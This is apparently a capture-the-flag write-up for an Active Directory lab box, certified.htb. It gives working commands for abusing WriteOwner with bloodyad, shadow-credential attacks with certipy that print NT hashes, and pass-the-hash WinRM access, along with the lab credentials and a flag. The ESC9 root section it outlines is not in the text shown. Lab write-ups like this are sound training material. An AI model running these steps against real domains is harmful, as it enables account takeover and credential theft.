### Summary
We start this box by enumerating `LDAP` with the given credentials and collecting `bloodhound` data. We find that the given user `judith` has `WriteOwner` over the `management` group which has `GenericWrite` over the `management_svc` user. We exploit the `WriteOwner` by giving `judith` ownership over the `management` group, allowing themself to add users to said group, and then adding themselves to the group. We then get credentials for `management_svc` by performing the shadow credential attack. `management_svc` has `Remote Management`, but there's nothing interesting on the box other than the user flag. `management_svc` also has `GenericAll` over `ca_operator`, allowing for another shadow credential attack. We inspect the certificate templates via `certipy` and find one that's potentially vulnerable to `ESC9`. We verify the vulnerability and execute, generating an `administrator.pfx` which we can use to gain administrator credentials!

### Tools
- `nxc`
- `bloodhound`
- `bloodyad`
- `certipy`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#nxc hosts file]]
- [[#SMB - TCP 445]]
- [[#Bloodhound]]
###### [[#User Shell - management_svc]]
- [[#WriteOwner]]
- [[#GenericWrite]]
	- [[#Shadow Credential]]
- [[#WinRM as management_svc]]
- [[#ADCS]]
###### [[#Root Shell]]
- [[#ESC9]]
	- [[#Verify Vulnerability]]
	- [[#Perform Exploit]]
- [[#WinRM]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.231.186 -oN nmap/tcp              
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49722/tcp open  unknown          syn-ack ttl 127
49727/tcp open  unknown          syn-ack ttl 127
```
```sh
❯ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49693,49694,49695,49722,49727 -sCV -vv 10.129.231.186 -oN nmap/tcpScripts
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-11 12:39:30Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1: 85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-11T12:41:06+00:00; +13m35s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-11T12:41:06+00:00; +13m35s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1: 85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1: 85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-11T12:41:06+00:00; +13m35s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1: 85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| DgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYI
| KwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBR9WLee
| Ma0LzKnM8ZrvzMNE41aWhTAfBgNVHSMEGDAWgBTs+xJAFaG9x9EuOy5NS3LAYt8r
| 9TCBzgYDVR0fBIHGMIHDMIHAoIG9oIG6hoG3bGRhcDovLy9DTj1jZXJ0aWZpZWQt
| REMwMS1DQSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
| cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNlcnRpZmllZCxEQz1o
| dGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNS
| TERpc3RyaWJ1dGlvblBvaW50MIHFBggrBgEFBQcBAQSBuDCBtTCBsgYIKwYBBQUH
| MAKGgaVsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPWNlcnRpZmllZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENs
| YXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOgYDVR0RAQH/BDAwLoISREMwMS5j
| ZXJ0aWZpZWQuaHRigg1jZXJ0aWZpZWQuaHRigglDRVJUSUZJRUQwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiUUJN4vt
| 459tCI43Rt0UQcaD1vWBs5AExrx2GxaZhj7r/mi7GCfFtVrlnDw70APgBb0Jzzq/
| LnF4q1yChWUxFvLeAyPbG+hLvk9OWvb2rmCK5S7RJIcwvJp2if8OP2WVuDvmdoyi
| xy+bc8JuIZtcACdlOIVsJlDU2NaPnepd1mV2lAOE8uUkB90ZvsCfYifAPwYuPVtH
| JpZihj6kismL/7rJ/8ZTsf2qbnttf1snzQvsdiNHFUMqxi7fY4mq+E1w+0BmFnLw
| GYiHqoY9bd5Ok+wz9YSJcJpKoHFnj5ObPz6JdFT/dlXAyZkmylijfMNbJ6x22hgI
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-11T12:41:06+00:00; +13m35s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 13m34s, deviation: 1s, median: 13m34s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-11T12:40:27
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 16877/tcp): CLEAN (Timeout)
|   Check 2 (port 47015/tcp): CLEAN (Timeout)
|   Check 3 (port 24870/udp): CLEAN (Timeout)
|   Check 4 (port 43816/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
- The TTL matches that of a Windows system
- Many of the ports correspond to an Active Directory box (`SMB`, `LDAP`, `kerberos-sec`, `kpasswd5`, etc.)
- We've got some clock skew happening which we'll need to correct when interacting with `kerberos`
- The certificate authority is `certified-DC01-CA`. We can verify this with `nxc ldap` (we'll be using `certipy` later, oh boy):
```sh
❯ nxc ldap 10.129.231.186 -u judith.mader -p judith09 -M adcs
LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
ADCS        10.129.231.186  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.231.186  389    DC01             Found PKI Enrollment Server: DC01.certified.htb
ADCS        10.129.231.186  389    DC01             Found CN: certified-DC01-CA
```

- We're given a set of credentials: `judith.mader` / `judith09`
	- They do not provide `WinRM` access

### nxc hosts file
```sh
❯ nxc smb 10.129.231.186 --generate-hosts-file hosts               
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)

❯ ccat hosts                                   
10.129.231.186     DC01.certified.htb certified.htb DC01
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## SMB - TCP 445
---
- We can enumerate the `SMB` shares `judith.mader` has access to:
```sh
❯ nxc smb 10.129.231.186 -u 'judith.mader' -p 'judith09' --shares
ADMIN$                          Remote Admin        
C$                              Default share       
IPC$            READ            Remote IPC          
NETLOGON        READ            Logon server share  
SYSVOL          READ            Logon server share  
```
- Look like the default AD shares

- We can also enumerate users:
```sh
❯ nxc smb 10.129.231.186 -u 'judith.mader' -p 'judith09' --users
-Username-                    -Last PW Set-       -BadPW- -Description-
Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain       
Guest                         <never>             0       Built-in account for guest access to the computer/domain     
krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account                      
judith.mader                  2024-05-14 19:22:11 0
management_svc                2024-05-13 15:30:51 0
ca_operator                   2024-05-13 15:32:03 0
alexander.huges               2024-05-14 16:39:08 0
harry.wilson                  2024-05-14 16:39:37 0
gregory.cameron               2024-05-14 16:40:05 0
```
- We've got a few non-default users that we'll store away in `users.txt`

## Bloodhound
---
- We can grab `LDAP` data via `bloodhound-ce-python` and `rusthound`:
```sh
❯ bloodhound-ce-python -d certified.htb -ns 10.129.231.186 -c all -u judith.mader -p judith09 --zip

❯ rusthound -d certified.htb -n 10.129.231.186 -u judith.mader -p judith09 -z --adcs
```

![[Pasted image 20260211080447.png]]
- With `WriteOwner`, `judith.mader` can add themselves to the `Management` group which has `GenericWrite` over `management_svc` who is a member of the `Remote Management Users` and has `GenericAll` over `ca_operator`

# User Shell - management_svc
## WriteOwner
---
- First we need to exploit the `WriteOwner` privileges by adding `judith.mader` to the `management` group:
```sh
❯ bloodyad -d certified.htb -u judith.mader -p judith09 -H DC01.certified.htb set owner management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on management
```
- Now we need to give `judith.mader` the ability to add members to the group; we can simply give `judith.mader` `GenericAll` over the `management` group:
```sh
❯ bloodyad -d certified.htb -u judith.mader -p judith09 -H DC01.certified.htb add genericAll management judith.mader
[+] judith.mader has now GenericAll on management
```
- Now we can just add `judith.mader` to the `management` group!
```sh
❯ bloodyad -d certified.htb -u judith.mader -p judith09 -H DC01.certified.htb add groupMember Management judith.mader
[+] judith.mader added to Management
```

## GenericWrite
---
### Shadow Credential
- With `GenericWrite`, over `management_svc`, we can try a shadow credentials attack:
```sh
❯ certipy shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc                
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'bbfdb1dbcbad49ddbcebd9fdb3dce8f6'
[*] Adding Key Credential with device ID 'bbfdb1dbcbad49ddbcebd9fdb3dce8f6' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'bbfdb1dbcbad49ddbcebd9fdb3dce8f6' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
- We've got a hash for `management_svc`! `a091c1832bcdd4677c28b5a6a1295584`

- We can verify `WinRM` access with `nxc`:
```sh
❯ nxc winrm 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584                                   
WINRM       10.129.231.186  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) 
WINRM       10.129.231.186  5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```

- We can perform a similar shadow credential attack on the user `ca_operator` since `management_svc` has `GenericAll` over them:
```sh
❯ certipy shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator       
...
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
- And we've got `ca_operator` / `b4b86f45c6018f1b664f70805f45d8f2` !!

## WinRM as management_svc
---
- We can grab the `user.txt` file!
```sh
❯ evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
895d13a09f620706039967a09f09441f
```

- There's nothing interesting in the `Users` directory
